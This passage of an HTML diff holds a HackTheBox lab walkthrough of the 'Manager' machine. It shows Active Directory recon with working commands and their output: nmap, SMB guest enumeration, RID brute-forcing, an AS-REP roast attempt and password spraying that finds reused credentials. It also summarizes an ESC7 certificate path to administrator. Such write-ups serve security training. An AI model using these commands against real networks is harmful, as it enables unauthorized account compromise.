@@ -1,0 +1,583 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Manager - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/medium/manager/img/manager.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Manager - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Manager">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Manager</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">10</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3>About Manager</h3><br/>
+<p>Manager is a medium-difficulty machine on HackTheBox. Initially, we'll abuse the guest session to perform a RID Bruteforce attack to identify valid users within the Domain Controller. The user "operator" has reused their username as a password, granting us valid credentials over the domain.</p><br/>
+<h3>Shell as raven</h3><br/>
+<p>As <code>operator</code>, we connect to the SQL Server using <code>mssqlclient</code> from Impacket. By exploiting the <code>xp_dirtree</code> feature, we discover an intriguing file in the website's root folder. This file contains credentials for the user "raven," and we gain access as them through WinRM.</p><br/>
+<h3>Shell as administrator</h3><br/>
+<p>As raven, we possess the <code>ManageCA</code> privilege, enabling us to exploit the Active Directory Certificate Services (ADCS), particularly the ESC7 vulnerability. This vulnerability allows us to obtain a valid certificate for the administrator user, granting us privileged access to the system.</p><br/>
+<h3>Recon</h3><br/>
+<p>As always, let's conduct a port scan to discover open ports on the victim machine. To achieve this, I will utilize <code>nmap</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nmap</span> <span class="mf">10.10.11.236</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">n</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.236</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65512</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>
+<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>
+<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
+<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+<span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span>
+<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">rpc</span><span class="o">-</span><span class="n">epmap</span>
+<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldapssl</span>
+<span class="mi">1433</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">s</span>
+<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAP</span>
+<span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAPssl</span>
+<span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsman</span>
+<span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">adws</span>
+<span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">49669</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">49670</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">49671</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">49742</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">50811</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">51448</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">52139</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+</pre></div>
+<p>It seems to be a domain controller (DC), so we're probably against an active directory environment.</p><br/>
+<h3>HTTP Service - Port 80</h3><br/>
+<p>A website is exposed on port 80:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/manager/img/1.png"/></p><br/>
+<p>After examining the website, I didn't discover any useful information or potential footholds. Consequently, I began enumerating the SMB service.</p><br/>
+<h3>SMB Enumeration - Port 445</h3><br/>
+<p>Let's enumerate the SMB service. This will allow us to obtain some information about the victim machine, such as its operating system, domain, and shared resources.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.236</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+</pre></div>
+<p>It is running Windows 10. Its hostname is <code>DC01</code>, suggesting it may be the domain controller. Since it shows us the domain, let's append it to our <code>hosts</code> file.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">ubuntu</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">fe00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localnet</span>
+<span class="n">ff00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">mcastprefix</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+
+<span class="mf">10.10.11.236</span> <span class="n">dc01</span><span class="o">.</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Next, let's check if we can list network-level shared resources. Since we lack credentials, we could attempt to log in to the SMB service using a Null Session.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.236</span> <span class="o">--</span><span class="n">shares</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Error</span> <span class="n">getting</span> <span class="n">user</span><span class="p">:</span> <span class="nb">list</span> <span class="n">index</span> <span class="n">out</span> <span class="n">of</span> <span class="nb">range</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Error</span> <span class="n">enumerating</span> <span class="n">shares</span><span class="p">:</span> <span class="n">STATUS_USER_SESSION_DELETED</span>
+</pre></div>
+<p>We received the <code>STATUS_USER_SESSION_DELETED</code> response, indicating that Null Session access is not permitted. This means we are unable to proceed with listing network-level shared resources using this method. However, we could attempt to log in using a Guest Session by specifying only an arbitrary username:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="s2">"elswix"</span> <span class="o">-</span><span class="n">p</span> <span class="s2">""</span> <span class="o">--</span><span class="n">shares</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">elswix</span><span class="p">:</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumerated</span> <span class="n">shares</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">Share</span>           <span class="n">Permissions</span>     <span class="n">Remark</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">ADMIN</span><span class="err">$</span>                          <span class="n">Remote</span> <span class="n">Admin</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">C</span><span class="err">$</span>                              <span class="n">Default</span> <span class="n">share</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">IPC</span><span class="err">$</span>            <span class="n">READ</span>            <span class="n">Remote</span> <span class="n">IPC</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">NETLOGON</span>                        <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">SYSVOL</span>                          <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span>
+</pre></div>
+<p>It worked! This confirms that we can use a Guest Session to enumerate the shared resources. However, upon reviewing the output, it's evident that we lack read access to any potentially interesting shared resources.</p><br/>
+<h3>RID Bruteforce</h3><br/>
+<p>For a clearer understanding of the attack, I will explain what the RID is.</p><br/>
+<p>In Active Directory, each object, including user accounts, has a unique SID (Security Identifier) consisting of a domain SID and a RID. The RID is a part of the SID that is unique within that specific domain. Therefore, if you know a valid RID within a domain, you can combine it with the known domain SID to get a valid SID, which is equivalent to a valid user account in that domain.</p><br/>
+<p>The Bruteforce RID technique involves trying to guess or enumerate valid RID values within a domain. This can be done in an automated fashion, trying a number of possible RIDs to see which ones generate valid SIDs. RIDs are typically integer values starting from 1000 and increasing in increments.</p><br/>
+<p>To achieve this, I will utilize <code>crackmapexec</code> and specify the <code>--rid-brute</code> parameter. The <code>--rid-brute</code> parameter allows us to perform a brute-force attack on RIDs within the domain.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="s2">"elswix"</span> <span class="o">-</span><span class="n">p</span> <span class="s2">""</span> <span class="o">--</span><span class="n">rid</span><span class="o">-</span><span class="n">brute</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">elswix</span><span class="p">:</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="mi">498</span><span class="p">:</span> <span class="n">MANAGER</span>\<span class="n">Enterprise</span> <span class="n">Read</span><span class="o">-</span><span class="n">only</span> <span class="n">Domain</span> <span class="n">Controllers</span> <span class="p">(</span><span class="n">SidTypeGroup</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="mi">500</span><span class="p">:</span> <span class="n">MANAGER</span>\<span class="n">Administrator</span> <span class="p">(</span><span class="n">SidTypeUser</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="mi">501</span><span class="p">:</span> <span class="n">MANAGER</span>\<span class="n">Guest</span> <span class="p">(</span><span class="n">SidTypeUser</span><span class="p">)</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="mi">1117</span><span class="p">:</span> <span class="n">MANAGER</span>\<span class="n">JinWoo</span> <span class="p">(</span><span class="n">SidTypeUser</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="mi">1118</span><span class="p">:</span> <span class="n">MANAGER</span>\<span class="n">ChinHae</span> <span class="p">(</span><span class="n">SidTypeUser</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="mi">1119</span><span class="p">:</span> <span class="n">MANAGER</span>\<span class="n">Operator</span> <span class="p">(</span><span class="n">SidTypeUser</span><span class="p">)</span>
+</pre></div>
+<p>As the output is extensive, I've copied it into a file and applied filters to extract the domain users:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">Administrator</span>
+<span class="n">Cheng</span>
+<span class="n">ChinHae</span>
+<span class="n">DC01</span><span class="err">$</span>
+<span class="n">Guest</span>
+<span class="n">JinWoo</span>
+<span class="n">krbtgt</span>
+<span class="n">Operator</span>
+<span class="n">Raven</span>
+<span class="n">Ryan</span>
+<span class="n">Zhong</span>
+</pre></div>
+<p>Since we have valid users within the domain, we could attempt an ASREP-Roast attack to obtain user passwords. ASREP-Roast attacks target Kerberos pre-authentication, with the goal of extracting password hashes from user accounts that do not require pre-authentication.</p><br/>
+<p>If you want to understand how this attack works, it's crucial to grasp the Kerberos Authentication Flow. My friend <a href="https://app.hackthebox.com/users/318121">ZaikoARG</a> has written an excellent article about it, which you can find <a href="https://medium.com/@zaikoarg/unmasking-kerberos-attacking-the-kerberos-authentication-layer-7c05a6efa52b">here</a>. I highly recommend taking a look.</p><br/>
+<p>For this purpose, I will use the <code>GetNPUsers.py</code> tool from the <a href="https://github.com/fortra/impacket">Impacket</a> suite:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetNPUsers</span><span class="o">.</span><span class="n">py</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">usersfile</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span><span class="o">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20230909.154612.3</span><span class="n">beeda7</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>
+
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">Administrator</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">Cheng</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">ChinHae</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">DC01</span><span class="err">$</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">Guest</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">JinWoo</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_CLIENT_REVOKED</span><span class="p">(</span><span class="n">Clients</span> <span class="n">credentials</span> <span class="n">have</span> <span class="n">been</span> <span class="n">revoked</span><span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">Operator</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">Raven</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">Ryan</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">Zhong</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
+</pre></div>
+<p>Any of these users has the <code>UF_DONT_REQUIRE_PREAUTH</code> attribute set, so this attack didn't work.</p><br/>
+<h4>Password Spraying</h4>
+<p>Sometimes, individuals reuse their usernames as passwords. Therefore, it's important to check if this is the case. With access to valid usernames, we can conduct a password spray to ascertain if they've used these usernames as passwords. To accomplish this, I'll convert my user wordlist to lowercase.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">administrator</span>
+<span class="n">cheng</span>
+<span class="n">chinhae</span>
+<span class="n">dc01</span><span class="err">$</span>
+<span class="n">guest</span>
+<span class="n">jinwoo</span>
+<span class="n">krbtgt</span>
+<span class="n">operator</span>
+<span class="n">raven</span>
+<span class="n">ryan</span>
+<span class="n">zhong</span>
+</pre></div>
+<p>Finally, we can utilize <code>crackmapexec</code> to check whether the users reuse their usernames as passwords.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="k">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">bruteforce</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">administrator</span><span class="p">:</span><span class="n">administrator</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">cheng</span><span class="p">:</span><span class="n">cheng</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">chinhae</span><span class="p">:</span><span class="n">chinhae</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">dc01</span><span class="err">$</span><span class="p">:</span><span class="n">dc01</span><span class="err">$</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">guest</span><span class="p">:</span><span class="n">guest</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">jinwoo</span><span class="p">:</span><span class="n">jinwoo</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">krbtgt</span><span class="p">:</span><span class="n">krbtgt</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">operator</span><span class="p">:</span><span class="n">operator</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">raven</span><span class="p">:</span><span class="n">raven</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">ryan</span><span class="p">:</span><span class="n">ryan</span> <span class="n">STATUS_LOGON_FAILURE</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">zhong</span><span class="p">:</span><span class="n">zhong</span> <span class="n">STATUS_LOGON_FAILURE</span>
+</pre></div>
+<p>As you can see, the user <code>operator</code> has reused their username as their password. Consequently, we have successfully obtained valid credentials for this user.</p><br/>
+<p>Let's verify if the user 'operator' has read access to any interesting shared resources.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="n">operator</span> <span class="o">-</span><span class="n">p</span> <span class="n">operator</span> <span class="o">--</span><span class="n">shares</span>
